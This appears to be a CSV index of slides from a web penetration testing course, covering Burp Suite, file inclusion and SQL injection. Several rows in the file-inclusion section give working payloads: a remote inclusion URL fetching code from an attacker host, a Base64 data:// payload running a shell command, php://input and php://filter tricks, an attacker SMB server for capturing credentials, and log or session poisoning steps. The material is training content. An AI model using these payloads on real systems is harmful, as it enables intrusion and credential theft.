S642-1.2.2.022,SEC642,9. Scope,,,,,,,,1.2.2: Burp Suite In-Depth,22,,,,,,sec642/43265/index.htm#9,,,,
S642-1.2.2.023,SEC642,10. Course Roadmap,,,,,,,,1.2.2: Burp Suite In-Depth,23,,,,,,sec642/43265/index.htm#10,,,,
S642-1.2.2.024,SEC642,11. Burp Proxy,,,,,,,,1.2.2: Burp Suite In-Depth,24,,,,,,sec642/43265/index.htm#11,,,,
S642-1.2.2.025,SEC642,12. Options,,,,,,,,1.2.2: Burp Suite In-Depth,25,,,,,,sec642/43265/index.htm#12,,,,
S642-1.2.2.026,SEC642,13. Proxy History,,,,,,,,1.2.2: Burp Suite In-Depth,26,,,,,,sec642/43265/index.htm#13,,,,
S642-1.2.2.027,SEC642,14. Web Interface,,,,,,,,1.2.2: Burp Suite In-Depth,27,,,,,,sec642/43265/index.htm#14,,,,
S642-1.2.2.028,SEC642,15. Course Roadmap,,,,,,,,1.2.2: Burp Suite In-Depth,28,,,,,,sec642/43265/index.htm#15,,,,
S642-1.2.2.029,SEC642,16. Burp Intruder,,,,,,,,1.2.2: Burp Suite In-Depth,29,,,,,,sec642/43265/index.htm#16,,,,
S642-1.2.2.030,SEC642,17. Fuzzing Types,,,,,,,,1.2.2: Burp Suite In-Depth,30,,,,,,sec642/43265/index.htm#17,,,,
S642-1.2.2.031,SEC642,18. Payloads,,,,,,,,1.2.2: Burp Suite In-Depth,31,,,,,,sec642/43265/index.htm#18,,,,
S642-1.2.2.032,SEC642,19. Intruder Options,,,,,,,,1.2.2: Burp Suite In-Depth,32,,,,,,sec642/43265/index.htm#19,,,,
S642-1.2.1.013,SEC642,13. Exploit Context,,,,,,,,1.2.1: Web Penetration Testing,13,,,,,,sec642/43260/index.htm#13,,,,
S642-1.2.1.012,SEC642,12. Vulnerability Context,,,,,,,,1.2.1: Web Penetration Testing,12,,,,,,sec642/43260/index.htm#12,,,,
S642-1.2.2.014,SEC642,1.2.2: Burp Suite In-Depth,,,,,,,,1.2.2: Burp Suite In-Depth,14,,,,,,sec642/43265/index.htm,,,,
S642-1.2.2.033,SEC642,20. Course Roadmap,,,,,,,,1.2.2: Burp Suite In-Depth,33,,,,,,sec642/43265/index.htm#20,,,,
S642-1.2.2.034,SEC642,21. Burp Repeater,,,,,,,,1.2.2: Burp Suite In-Depth,34,,,,,,sec642/43265/index.htm#21,,,,
S642-1.2.2.038,SEC642,25. Scripting Pieces,,,,,,,,1.2.2: Burp Suite In-Depth,38,,,,,,sec642/43265/index.htm#25,,,,
S642-1.2.2.039,SEC642,26. Scripting Basics with Buby,,,,,,,,1.2.2: Burp Suite In-Depth,39,,,,,,sec642/43265/index.htm#26,,,,
S642-1.2.2.040,SEC642,27. Configuration Methods,,,,,,,,1.2.2: Burp Suite In-Depth,40,,,,,,sec642/43265/index.htm#27,,,,
S642-1.2.2.041,SEC642,28. Action Methods,,,,,,,,1.2.2: Burp Suite In-Depth,41,,,,,,sec642/43265/index.htm#28,,,,
S642-1.2.2.036,SEC642,23. Course Roadmap,,,,,,,,1.2.2: Burp Suite In-Depth,36,,,,,,sec642/43265/index.htm#23,,,,
S642-1.2.2.043,SEC642,30. Sample Script,,,,,,,,1.2.2: Burp Suite In-Depth,43,,,,,,sec642/43265/index.htm#30,,,,
S642-1.2.2.044,SEC642,31. Course Roadmap,,,,,,,,1.2.2: Burp Suite In-Depth,44,,,,,,sec642/43265/index.htm#31,,,,
S642-1.2.2.045,SEC642,32. Burp Suite Exercise,,,,,,,,1.2.2: Burp Suite In-Depth,45,,,,,,sec642/43265/index.htm#32,,,,
S642-1.2.2.035,SEC642,22. Using Repeater,,,,,,,,1.2.2: Burp Suite In-Depth,35,,,,,,sec642/43265/index.htm#22,,,,
S642-1.2.2.047,SEC642,34. Burp Exercise: Launch Burp and Register User,,,,,,,,1.2.2: Burp Suite In-Depth,47,,,,,,sec642/43265/index.htm#34,,,,
S642-1.2.2.037,SEC642,24. Burp Scripting,,,,,,,,1.2.2: Burp Suite In-Depth,37,,,,,,sec642/43265/index.htm#24,,,,
S642-1.2.2.042,SEC642,29. Event Handlers,,,,,,,,1.2.2: Burp Suite In-Depth,42,,,,,,sec642/43265/index.htm#29,,,,
S642-1.2.2.046,SEC642,33. Answers Ahead!,,,,,,,,1.2.2: Burp Suite In-Depth,46,,,,,,sec642/43265/index.htm#33,,,,
S642-1.2.2.048,SEC642,35. Burp Exercise: Map the Application,,,,,,,,1.2.2: Burp Suite In-Depth,48,,,,,,sec642/43265/index.htm#35,,,,
S642-1.2.2.049,SEC642,36. Burp Exercise: Use Repeater,,,,,,,,1.2.2: Burp Suite In-Depth,49,,,,,,sec642/43265/index.htm#36,,,,
S642-1.2.2.053,SEC642,40. Complex Applications,,,,,,,,1.2.2: Burp Suite In-Depth,53,,,,,,sec642/43265/index.htm#40,,,,
S642-1.2.2.054,SEC642,41. Server-side Flaws,,,,,,,,1.2.2: Burp Suite In-Depth,54,,,,,,sec642/43265/index.htm#41,,,,
S642-1.2.2.055,SEC642,42. Discovery and Exploitation,,,,,,,,1.2.2: Burp Suite In-Depth,55,,,,,,sec642/43265/index.htm#42,,,,
S642-1.2.3.056,SEC642,1.2.3: File Inclusion and Code Execution,,,,,,,,1.2.3: File Inclusion and Code Execution,56,,,,,,sec642/43270/index.htm,,,,
S642-1.2.3.057,SEC642,2. File Inclusion,,,,,,,,1.2.3: File Inclusion and Code Execution,57,,,,,,sec642/43270/index.htm#2,,,,
S642-1.2.3.058,SEC642,3. Exploiting File Inclusion,,,,,,,,1.2.3: File Inclusion and Code Execution,58,,,,,,sec642/43270/index.htm#3,,,,
S642-1.2.2.051,SEC642,38. Review: Burp Exercise,,,,,,,,1.2.2: Burp Suite In-Depth,51,,,,,,sec642/43265/index.htm#38,,,,
S642-1.2.2.050,SEC642,37. Burp Exercise: Fuzz the Application,,,,,,,,1.2.2: Burp Suite In-Depth,50,,,,,,sec642/43265/index.htm#37,,,,
S642-1.2.2.052,SEC642,39. Course Roadmap,,,,,,,,1.2.2: Burp Suite In-Depth,52,,,,,,sec642/43265/index.htm#39,,,,
S642-1.2.3.060,SEC642,5. File Inclusion Methodology,Remote File Inclusion (RFI),Remote File Inclusion (RFI),Remote File Inclusion (RFI),Remote File Inclusion (RFI),3,"WAHH 7.1.3 (fuzzing), 7.7",,1.2.3: File Inclusion and Code Execution,60,,,true,,,sec642/43270/index.htm#5,,,,
S642-1.2.3.062,SEC642,7. Limitations of File Inclusion (2),,,,,,,,1.2.3: File Inclusion and Code Execution,62,,,,,,sec642/43270/index.htm#7,,,,
S642-1.2.3.059,SEC642,4. File Inclusion Across Languages,,,,,,,,1.2.3: File Inclusion and Code Execution,59,,,,,,sec642/43270/index.htm#4,,,,
S642-1.2.3.060,SEC642,5. File Inclusion Methodology,Local File Inclusion (LFI),Local File Inclusion (LFI),Local File Inclusion (LFI),Local File Inclusion (LFI),,WAHH 7.1.3 (fuzzing),,1.2.3: File Inclusion and Code Execution,60,,,true,,,sec642/43270/index.htm#5,,,,
S642-1.2.3.061,SEC642,6. Limitations of File Inclusion (1),,,,,,,,1.2.3: File Inclusion and Code Execution,61,,,,,,sec642/43270/index.htm#6,,,,
S642-1.2.3.063,SEC642,8. Pillaging Local File Inclusion,,,,,,,,1.2.3: File Inclusion and Code Execution,63,,,,,,sec642/43270/index.htm#8,,,,
S642-1.2.3.067,SEC642,12. Code Execution with RFI,,,Exploitable RFI: PHP code injection,,,Example: httpx://fileview.php?loc=httpx://attacker/phpcode.txt,,1.2.3: File Inclusion and Code Execution,67,,,true,,,sec642/43270/index.htm#12,,,,
S642-1.2.3.068,SEC642,13. Firewall? No Problem!,,,,,,,,1.2.3: File Inclusion and Code Execution,68,,,,,,sec642/43270/index.htm#13,,,,
S642-1.2.3.069,SEC642,14. PHP Stream Wrappers,PHP Code Injection via PHP stream in form input (RFI exploit),PHP Code Injection via PHP stream in form input (RFI exploit),Exploitable RFI: code injection via PHP stream in form input,PHP Code Injection via PHP stream in form input (RFI exploit),3,Exploit PHP RFI vuln via PHP command injection in POST input: <form action:�httpx://HOST/fileview.php?loc=php://input� method=�post� enctype=�text/plain�><input type=�text� name=�exploit� value=�<?php phpinfo(); ?>�  />,,1.2.3: File Inclusion and Code Execution,69,,,true,,,sec642/43270/index.htm#14,,,,
S642-1.2.3.065,SEC642,10. Preventing Execution in LFI (2),,,,,,,,1.2.3: File Inclusion and Code Execution,65,,,,,,sec642/43270/index.htm#10,,,,
S642-1.2.3.069,SEC642,14. PHP Stream Wrappers,Code Injection via PHP stream in URL param (RFI exploit),Code Injection via PHP stream in URL param (RFI exploit),Exploitable RFI: code injection via PHP stream in URL param,Code Injection via PHP stream in URL param (RFI exploit),3,"Exploit PHP RFI vuln with Base64-encoded command injection in GET param.: httpx://HOST/fileview.php?loc=data://text/plain;base64, PD9waHAgc3lzdGVtKCdscycpOyA/Pg==  (Base64-encoded PHP code)",,1.2.3: File Inclusion and Code Execution,69,,,true,,,sec642/43270/index.htm#14,,,,
S642-1.2.3.071,SEC642,16. Exploiting File Inclusion w/ SMB,,,,,,,,1.2.3: File Inclusion and Code Execution,71,,,,,,sec642/43270/index.htm#16,,,,
S642-1.2.3.070,SEC642,15. Bypassing RFI Restrictions,Remote File Inclusion (RFI) via SMB (LFI/RFI exploit),Remote File Inclusion (RFI) via SMB (LFI/RFI exploit),Exploitable LFI: RFI via SMB,Remote File Inclusion (RFI) via SMB (LFI/RFI exploit),3,"On Windows, leverage the Windows web server's SMB client by using UNC Path \\HOST\FILE where a LFI vuln exist. Also try exploiting the SMB client (of web server) by sending to attacker-controlled SMB server (put XSS or phpshell page, capture SMB credentials...).",,1.2.3: File Inclusion and Code Execution,70,,,true,,,sec642/43270/index.htm#15,,,,
S642-1.2.3.064,SEC642,9. Preventing Execution in LFI (1),,,Exploitable LFI: PHP source disclosure,,,Exploit LFI by reading PHP source file by using �php://filter...�: Httpx://HOST/fileview.php?loc=php://filter/read=convert.base64-encode/resource=config.php,,1.2.3: File Inclusion and Code Execution,64,,,true,,,sec642/43270/index.htm#9,,,,
S642-1.2.3.066,SEC642,11. Course Roadmap,,,,,,,,1.2.3: File Inclusion and Code Execution,66,,,,,,sec642/43270/index.htm#11,,,,
S642-1.2.3.073,SEC642,18. File Inclusion Exercise,,,,,,,,1.2.3: File Inclusion and Code Execution,73,,,,,,sec642/43270/index.htm#18,,,,
S642-1.2.3.076,SEC642,21. Exercise: Create a Paste,,,,,,,,1.2.3: File Inclusion and Code Execution,76,,,,,,sec642/43270/index.htm#21,,,,
S642-1.2.3.072,SEC642,17. Course Roadmap,,,,,,,,1.2.3: File Inclusion and Code Execution,72,,,,,,sec642/43270/index.htm#17,,,,
S642-1.2.3.074,SEC642,19. Exercise: Answers Ahead!,,,,,,,,1.2.3: File Inclusion and Code Execution,74,,,,,,sec642/43270/index.htm#19,,,,
S642-1.2.3.075,SEC642,20. Exercise: Non-executable LFI,,,,,,,,1.2.3: File Inclusion and Code Execution,75,,,,,,sec642/43270/index.htm#20,,,,
S642-1.2.3.077,SEC642,22. Exercise: View the Paste,,,,,,,,1.2.3: File Inclusion and Code Execution,77,,,,,,sec642/43270/index.htm#22,,,,
S642-1.2.3.078,SEC642,23. Exercise: View Source,,,,,,,,1.2.3: File Inclusion and Code Execution,78,,,,,,sec642/43270/index.htm#23,,,,
S642-1.2.3.079,SEC642,24. Exercise: Pillage!,,,,,,,,1.2.3: File Inclusion and Code Execution,79,,,,,,sec642/43270/index.htm#24,,,,
S642-1.2.3.080,SEC642,25. Exercise: File Include Over SMB,,,,,,,,1.2.3: File Inclusion and Code Execution,80,,,,,,sec642/43270/index.htm#25,,,,
S642-1.2.3.082,SEC642,27. Course Roadmap,,,,,,,,1.2.3: File Inclusion and Code Execution,82,,,,,,sec642/43270/index.htm#27,,,,
S642-1.2.3.084,SEC642,29. Application and Server Files,,,Exploitable LFI: code execution using app or server file,,3,"Test code execution via LFI of application content: app-specific files created by attacker (blog posts, comments...); files on web server the app is running on: e-mail files, files uploaded via FTP, SMB share, other server upload function or other file contents on that server",,1.2.3: File Inclusion and Code Execution,84,,,true,,,sec642/43270/index.htm#29,,,,
S642-1.2.3.086,SEC642,31. Uses for /proc/self,,,,,,,,1.2.3: File Inclusion and Code Execution,86,,,,,,sec642/43270/index.htm#31,,,,
S642-1.2.3.087,SEC642,32. /proc/self/fd/# Result,,,,,,,,1.2.3: File Inclusion and Code Execution,87,,,,,,sec642/43270/index.htm#32,,,,
S642-1.2.3.088,SEC642,33. PHP Session Files,,,,,,,,1.2.3: File Inclusion and Code Execution,88,,,,,,sec642/43270/index.htm#33,,,,
S642-1.2.3.085,SEC642,30. Abusing /proc/self,,,Exploitable LFI: leakage of  OS-generated content (/proc/self),,3,"Test LFI of content under /proc/self: environ, cmdline, fd/[3-100]",,1.2.3: File Inclusion and Code Execution,85,,,true,,,sec642/43270/index.htm#30,,,,
S642-1.2.3.089,SEC642,34. Code Exec from Session Files,,,Exploitable LFI: code execution from PHP session files,,3,POST PHP code data into a form. LFI to /var/lib/php5/sess_PHPSESSID,,1.2.3: File Inclusion and Code Execution,89,,,true,,,sec642/43270/index.htm#34,,,,
S642-1.2.3.083,SEC642,28. LFI to Code Execution,,,Exploitable LFI: code execution,,3,Verify code execution via LFI of server-side content (see other issues).,,1.2.3: File Inclusion and Code Execution,83,,,true,,,sec642/43270/index.htm#28,,,,
S642-1.2.3.081,SEC642,26. Review: File Inclusion,,,,,,,,1.2.3: File Inclusion and Code Execution,81,,,,,,sec642/43270/index.htm#26,,,,
S642-1.2.3.093,SEC642,38. LFI to Code Execution Exercise,,,,,,,,1.2.3: File Inclusion and Code Execution,93,,,,,,sec642/43270/index.htm#38,,,,
S642-1.2.3.094,SEC642,39. Base64 with Decoder in Burp,,,,,,,,1.2.3: File Inclusion and Code Execution,94,,,,,,sec642/43270/index.htm#39,,,,
S642-1.2.3.095,SEC642,40. Exercise: Answers Ahead!,,,,,,,,1.2.3: File Inclusion and Code Execution,95,,,,,,sec642/43270/index.htm#40,,,,
S642-1.2.3.096,SEC642,41. Exercise: Determine Limitations,,,,,,,,1.2.3: File Inclusion and Code Execution,96,,,,,,sec642/43270/index.htm#41,,,,
S642-1.2.3.097,SEC642,42. Exercise: php://filter on login.php,,,,,,,,1.2.3: File Inclusion and Code Execution,97,,,,,,sec642/43270/index.htm#42,,,,
S642-1.2.3.098,SEC642,43. Exercise: php://filter on config.php,,,,,,,,1.2.3: File Inclusion and Code Execution,98,,,,,,sec642/43270/index.htm#43,,,,
S642-1.2.3.091,SEC642,36. Log File Poisoning (2),,,,,,,,1.2.3: File Inclusion and Code Execution,91,,,,,,sec642/43270/index.htm#36,,,,
S642-1.2.3.100,SEC642,45. Exercise: Include Session File,,,,,,,,1.2.3: File Inclusion and Code Execution,100,,,,,,sec642/43270/index.htm#45,,,,
S642-1.2.3.101,SEC642,46. Review: File Inclusion,,,,,,,,1.2.3: File Inclusion and Code Execution,101,,,,,,sec642/43270/index.htm#46,,,,
S642-1.2.3.102,SEC642,47. Course Roadmap,,,,,,,,1.2.3: File Inclusion and Code Execution,102,,,,,,sec642/43270/index.htm#47,,,,
S642-1.2.3.090,SEC642,35. Log File Poisoning (1),,,Exploitable LFI: code execution via log file poisoning,,3,Poison a log file that's accessible from web root with server-side code and get the server to execute it via LFI.,,1.2.3: File Inclusion and Code Execution,90,,,true,,,sec642/43270/index.htm#35,,,,
S642-1.2.3.092,SEC642,37. Course Roadmap,,,,,,,,1.2.3: File Inclusion and Code Execution,92,,,,,,sec642/43270/index.htm#37,,,,
S642-1.2.3.099,SEC642,44. Exercise: Poison Session File,,,,,,,,1.2.3: File Inclusion and Code Execution,99,,,,,,sec642/43270/index.htm#44,,,,
S642-1.2.3.104,SEC642,49. PHP File Upload Attack v2 (1),Exploit LFI and file upload by executing the uploaded file in the PHP temp directory.,Exploit LFI and file upload by executing the uploaded file in the PHP temp directory.,Exploitable LFI and file upload to phpinfo page: PHP code execution during file upload,Exploit LFI and file upload by executing the uploaded file in the PHP temp directory.,3,"Use phpinfolfi.py script to 1) upload a file with PHP code, 2) stall the response, 3) LFI the uploaded file in the temp dir.",,1.2.3: File Inclusion and Code Execution,104,,,true,,,sec642/43270/index.htm#49,,,,
S642-1.2.3.107,SEC642,52. File Inclusion Tips,Exploit LFI and file upload by executing the uploaded file in the PHP temp directory.,Exploit LFI and file upload by executing the uploaded file in the PHP temp directory.,Exploitable LFI: tips,Exploit LFI and file upload by executing the uploaded file in the PHP temp directory.,3,See test link,,1.2.3: File Inclusion and Code Execution,107,,,true,,,sec642/43270/index.htm#52,,,,
S642-1.2.3.108,SEC642,53. Course Roadmap,,,,,,,,1.2.3: File Inclusion and Code Execution,108,,,,,,sec642/43270/index.htm#53,,,,
S642-1.2.3.109,SEC642,54. File Upload to Code Exec Exercise,,,,,,,,1.2.3: File Inclusion and Code Execution,109,,,,,,sec642/43270/index.htm#54,,,,
S642-1.2.3.110,SEC642,55. Exercise: Answers Ahead!,,,,,,,,1.2.3: File Inclusion and Code Execution,110,,,,,,sec642/43270/index.htm#55,,,,
S642-1.2.3.103,SEC642,48. PHP File Upload Attack v1,Exploit LFI and file upload by performing code execution of PHP temp file during file upload (Windows),Exploit LFI and file upload by performing code execution of PHP temp file during file upload (Windows),Exploitable LFI and file upload: code execution of PHP temp file during file upload (Windows),Exploit LFI and file upload by performing code execution of PHP temp file during file upload (Windows),3,"Perform a file upload (via POST) with PHP code to execute. PHP will put it into an unknown filename in the TEMP directory. Then run it via LFI: ""fileview.php?loc=C:\Windows\Temp\php<.tmp"". This causes the vulnerable PHP script to include the file path C:\Windows\Temp\php*.tmp, bypassing the need to know the exact file name, and executing any code found within.",,1.2.3: File Inclusion and Code Execution,103,,,true,,,sec642/43270/index.htm#48,,,,
S642-1.2.3.112,SEC642,57. Exercise: Bypass Limitations,,,,,,,,1.2.3: File Inclusion and Code Execution,112,,,,,,sec642/43270/index.htm#57,,,,
S642-1.2.3.113,SEC642,58. Exercise: Test Upload to phpinfo (1),,,,,,,,1.2.3: File Inclusion and Code Execution,113,,,,,,sec642/43270/index.htm#58,,,,
S642-1.2.3.106,SEC642,"51. Code Execution, Now What?",,,,,,,,1.2.3: File Inclusion and Code Execution,106,,,true,,,sec642/43270/index.htm#51,,,,
S642-1.2.3.115,SEC642,60. Exercise: Get phpinfolfi.py,,,,,,,,1.2.3: File Inclusion and Code Execution,115,,,,,,sec642/43270/index.htm#60,,,,
S642-1.2.3.105,SEC642,50. PHP File Upload Attack v2 (2),,,,,,,,1.2.3: File Inclusion and Code Execution,105,,,true,,,sec642/43270/index.htm#50,,,,
S642-1.2.3.111,SEC642,56. Exercise: View Source Locally,,,,,,,,1.2.3: File Inclusion and Code Execution,111,,,,,,sec642/43270/index.htm#56,,,,
S642-1.2.3.114,SEC642,59. Exercise: Upload to phpinfo (2),,,,,,,,1.2.3: File Inclusion and Code Execution,114,,,,,,sec642/43270/index.htm#59,,,,
S642-1.2.3.116,SEC642,61. Exercise: Modify phpinfolfi.py,,,,,,,,1.2.3: File Inclusion and Code Execution,116,,,,,,sec642/43270/index.htm#61,,,,
S642-1.2.3.117,SEC642,62. Exercise: Run phpinfolfi.py,,,,,,,,1.2.3: File Inclusion and Code Execution,117,,,,,,sec642/43270/index.htm#62,,,,
S642-1.2.4.120,SEC642,1.2.4: SQL Injection,,,,,,,,1.2.4: SQL Injection,120,,,,,,sec642/43275/index.htm,,,,
S642-1.2.4.122,SEC642,3. SQL Injection - Injection Points,,,,,,,,1.2.4: SQL Injection,122,,,true,,,sec642/43275/index.htm#3,,,,
S642-1.2.4.123,SEC642,4. SQL Injection - Discovery,,,,,,,,1.2.4: SQL Injection,123,,,true,,,sec642/43275/index.htm#4,,,,
S642-1.2.4.124,SEC642,5. SQL Injection - Prefix and Suffix,,,,,,,,1.2.4: SQL Injection,124,,,true,,,sec642/43275/index.htm#5,,,,
S642-1.2.4.125,SEC642,6. Course Roadmap,,,,,,,,1.2.4: SQL Injection,125,,,,,,sec642/43275/index.htm#6,,,,
S642-1.2.4.126,SEC642,7. SQL Injection - Data Exfiltration,,,,,,,,1.2.4: SQL Injection,126,,,true,,,sec642/43275/index.htm#7,,,,
S642-1.2.4.127,SEC642,8. Example SQL,,,,,,,,1.2.4: SQL Injection,127,,,true,,,sec642/43275/index.htm#8,,,,
S642-1.2.3.119,SEC642,64. Review: File Inclusion,,,,,,,,1.2.3: File Inclusion and Code Execution,119,,,,,,sec642/43270/index.htm#64,,,,
S642-1.2.4.129,SEC642,10. Error Message Output,,,,,0,,,1.2.4: SQL Injection,129,,,true,,,sec642/43275/index.htm#10,391,,,
S642-1.2.4.130,SEC642,11. Error Message Example,,,,,,,,1.2.4: SQL Injection,130,,,true,,,sec642/43275/index.htm#11,,,,
S642-1.2.4.131,SEC642,12. Blind SQL Injection,,,,,,,,1.2.4: SQL Injection,131,,,true,,,sec642/43275/index.htm#12,,,,
S642-1.2.3.118,SEC642,63. Exercise: Access the Shell,,,,,,,,1.2.3: File Inclusion and Code Execution,118,,,,,,sec642/43270/index.htm#63,,,,
S642-1.2.4.133,SEC642,14. Boolean to Heuristic Brute Force,,,,,,,,1.2.4: SQL Injection,133,,,true,,,sec642/43275/index.htm#14,,,,
S642-1.2.4.121,SEC642,2. SQL Injection - Refresher,,,,,,,,1.2.4: SQL Injection,121,,,true,,,sec642/43275/index.htm#2,,,,
S642-1.2.4.128,SEC642,9. Single Line of Output,,,,,,,,1.2.4: SQL Injection,128,,,true,,,sec642/43275/index.htm#9,,,,
S642-1.2.4.132,SEC642,13. Boolean Output to Anything,,,,,,,,1.2.4: SQL Injection,132,,,true,,,sec642/43275/index.htm#13,,,,
S642-1.2.4.137,SEC642,18. Course Roadmap,,,,,,,,1.2.4: SQL Injection,137,,,,,,sec642/43275/index.htm#18,,,,
S642-1.2.4.138,SEC642,19. SQL Injection Tool: Havij,,,,,,,,1.2.4: SQL Injection,138,,,true,,,sec642/43275/index.htm#19,,,,
S642-1.2.4.139,SEC642,20. Optional Havij Lab,,,,,,,,1.2.4: SQL Injection,139,,,true,,,sec642/43275/index.htm#20,,,,
S642-1.2.4.135,SEC642,16. Query Timing as Output,,,,,,,,1.2.4: SQL Injection,135,,,true,,,sec642/43275/index.htm#16,,,,
S642-1.2.4.141,SEC642,22. sqlmap: Using Recon Data,,,,,,,,1.2.4: SQL Injection,141,,,true,,,sec642/43275/index.htm#22,,,,
S642-1.2.4.142,SEC642,23. sqlmap: Improving Discovery,,,,,,,,1.2.4: SQL Injection,142,,,true,,,sec642/43275/index.htm#23,,,,
S642-1.2.4.134,SEC642,15. Boolean to Binary Search Tree,,,,,,,,1.2.4: SQL Injection,134,,,true,,,sec642/43275/index.htm#15,,,,
S642-1.2.4.140,SEC642,21. SQL Injection Tool: sqlmap,,,,,,,,1.2.4: SQL Injection,140,,,true,,,sec642/43275/index.htm#21,,,,
S642-1.2.4.136,SEC642,17. Side-channel Data Retrieval,,,,,,,,1.2.4: SQL Injection,136,,,true,,,sec642/43275/index.htm#17,,,,
S642-1.2.4.144,SEC642,25. sqlmap: Payloads and Queries,,,,,,,,1.2.4: SQL Injection,144,,,true,,,sec642/43275/index.htm#25,,,,
S642-1.2.4.143,SEC642,24. sqlmap: Focusing Exploitation,,,,,,,,1.2.4: SQL Injection,143,,,true,,,sec642/43275/index.htm#24,,,,
S642-1.2.4.145,SEC642,26. sqlmap: payloads.xml Format,,,,,,,,1.2.4: SQL Injection,145,,,true,,,sec642/43275/index.htm#26,,,,
S642-1.2.4.147,SEC642,28. Course Roadmap,,,,,,,,1.2.4: SQL Injection,147,,,,,,sec642/43275/index.htm#28,,,,
S642-1.2.4.146,SEC642,27. SQL Injection Tips,,,,,,,,1.2.4: SQL Injection,146,,,true,,,sec642/43275/index.htm#27,,,,
S642-1.2.4.148,SEC642,29. SQL Injection Exercise: Part 1,,,,,,,,1.2.4: SQL Injection,148,,,,,,sec642/43275/index.htm#29,,,,
S642-1.2.4.149,SEC642,30. Part 1: Answers Ahead!,,,,,,,,1.2.4: SQL Injection,149,,,,,,sec642/43275/index.htm#30,,,,
S642-1.2.4.150,SEC642,31. Part 1: Discovery with sqlmap,,,,,,,,1.2.4: SQL Injection,150,,,true,,,sec642/43275/index.htm#31,,,,
S642-1.2.4.151,SEC642,32. Part 1: --prefix and --suffix,,,,,,,,1.2.4: SQL Injection,151,,,true,,,sec642/43275/index.htm#32,,,,
S642-1.2.4.152,SEC642,33. Part 1: Found Injections Output,,,,,,,,1.2.4: SQL Injection,152,,,true,,,sec642/43275/index.htm#33,,,,
S642-1.2.4.153,SEC642,34. Part 1: A Better Way?,,,,,,,,1.2.4: SQL Injection,153,,,true,,,sec642/43275/index.htm#34,,,,
S642-1.2.4.154,SEC642,35. Part 1: Reviewing payloads.xml,,,,,,,,1.2.4: SQL Injection,154,,,,,,sec642/43275/index.htm#35,,,,
S642-1.2.4.155,SEC642,36. Part 1: --technique=BE,,,,,,,,1.2.4: SQL Injection,155,,,true,,,sec642/43275/index.htm#36,,,,
S642-1.2.4.156,SEC642,37. Part 1: --technique=T,,,,,,,,1.2.4: SQL Injection,156,,,true,,,sec642/43275/index.htm#37,,,,
S642-1.2.4.157,SEC642,38. SQL Injection Exercise: Part 2,,,,,,,,1.2.4: SQL Injection,157,,,,,,sec642/43275/index.htm#38,,,,
S642-1.2.4.159,SEC642,40. Part 2: Configuring Burp Proxy,,,,,,,,1.2.4: SQL Injection,159,,,true,,,sec642/43275/index.htm#40,,,,
S642-1.2.4.162,SEC642,43. Part 2: Burp Log in sqlmap (1),,,,,,,,1.2.4: SQL Injection,162,,,true,,,sec642/43275/index.htm#43,,,,
S642-1.2.4.163,SEC642,44. Part 2: Burp Log in sqlmap (2),,,,,,,,1.2.4: SQL Injection,163,,,true,,,sec642/43275/index.htm#44,,,,
S642-1.2.4.164,SEC642,45. Part 2: A False Negative,,,,,,,,1.2.4: SQL Injection,164,,,true,,,sec642/43275/index.htm#45,,,,
S642-1.2.4.165,SEC642,46. Part 2: Data Exfiltration (1),,,,,,,,1.2.4: SQL Injection,165,,,true,,,sec642/43275/index.htm#46,,,,
S642-1.2.4.166,SEC642,47. Part 2: Data Exfiltration (2),,,,,,,,1.2.4: SQL Injection,166,,,true,,,sec642/43275/index.htm#47,,,,
S642-1.2.4.167,SEC642,48. Exercise Summary,,,,,,,,1.2.4: SQL Injection,167,,,,,,sec642/43275/index.htm#48,,,,
S642-1.2.4.168,SEC642,49. Course Roadmap,,,,,,,,1.2.4: SQL Injection,168,,,,,,sec642/43275/index.htm#49,,,,
S642-1.2.4.169,SEC642,50. Conclusions,,,,,,,,1.2.4: SQL Injection,169,,,,,,sec642/43275/index.htm#50,,,,
S642-1.2.4.170,SEC642,51. Optional Havij Exercise,,,,,,,,1.2.4: SQL Injection,170,,,,,,sec642/43275/index.htm#51,,,,
S642-1.2.4.171,SEC642,52. Part 1: Install and Open Havij,,,,,,,,1.2.4: SQL Injection,171,,,true,,,sec642/43275/index.htm#52,,,,
S642-1.2.4.158,SEC642,39. Part 2: Answers Ahead!,,,,,,,,1.2.4: SQL Injection,158,,,,,,sec642/43275/index.htm#39,,,,
S642-1.2.4.173,SEC642,54. Part 1: Discovery with Havij,,,,,,,,1.2.4: SQL Injection,173,,,true,,,sec642/43275/index.htm#54,,,,
S642-1.2.4.161,SEC642,42. Part 2: Performing Recon,,,,,,,,1.2.4: SQL Injection,161,,,true,,,sec642/43275/index.htm#42,,,,
S642-1.2.4.160,SEC642,41. Part 2: Configuring Burp Log,,,,,,,,1.2.4: SQL Injection,160,,,true,,,sec642/43275/index.htm#41,,,,
S642-1.2.4.172,SEC642,53. Part 1: Browse the Target Site,,,,,,,,1.2.4: SQL Injection,172,,,true,,,sec642/43275/index.htm#53,,,,
S642-1.2.4.174,SEC642,55. Part 1: Exploitation with Havij,,,,,,,,1.2.4: SQL Injection,174,,,true,,,sec642/43275/index.htm#55,,,,
S642-1.2.4.175,SEC642,56. Review: Havij,,,,,,,,1.2.4: SQL Injection,175,,,,,,sec642/43275/index.htm#56,,,,
S642-2.1.1.176,SEC642,2.1.1: Client-side Issues,,,,,,,,2.1.1: Client-side Issues,176,,,true,,,sec642/43280/index.htm,,,,
S642-2.1.1.178,SEC642,3. Client-side Issues,,,,,,,,2.1.1: Client-side Issues,178,,,true,,,sec642/43280/index.htm#3,,,,
S642-2.1.1.181,SEC642,6. Client-side Piece Review,,,,,,,,2.1.1: Client-side Issues,181,,,,,,sec642/43280/index.htm#6,,,,
S642-2.1.1.182,SEC642,7. Exploiting Client-side Issues,,,,,,,,2.1.1: Client-side Issues,182,,,true,,,sec642/43280/index.htm#7,,,,
S642-2.1.1.183,SEC642,8. Social Engineering,,,,,,,,2.1.1: Client-side Issues,183,,,true,,,sec642/43280/index.htm#8,,,,
S642-2.1.1.184,SEC642,9. Client-side Issues,,,,,,,,2.1.1: Client-side Issues,184,,,true,,,sec642/43280/index.htm#9,,,,
S642-2.1.2.185,SEC642,2.1.2: Cross-Site Scripting,,,,,,,,2.1.2: Cross-Site Scripting,185,,,true,,,sec642/43285/index.htm,,,,
S642-2.1.2.186,SEC642,2. Cross-site Scripting Review,,,,,,,,2.1.2: Cross-Site Scripting,186,,,,,,sec642/43285/index.htm#2,,,,
S642-2.1.2.187,SEC642,3. Parts of a XSS Attack,,,,,,,,2.1.2: Cross-Site Scripting,187,,,true,,,sec642/43285/index.htm#3,,,,
S642-2.1.1.177,SEC642,2. Course Roadmap,,,,,,,,2.1.1: Client-side Issues,177,,,,,,sec642/43280/index.htm#2,,,,
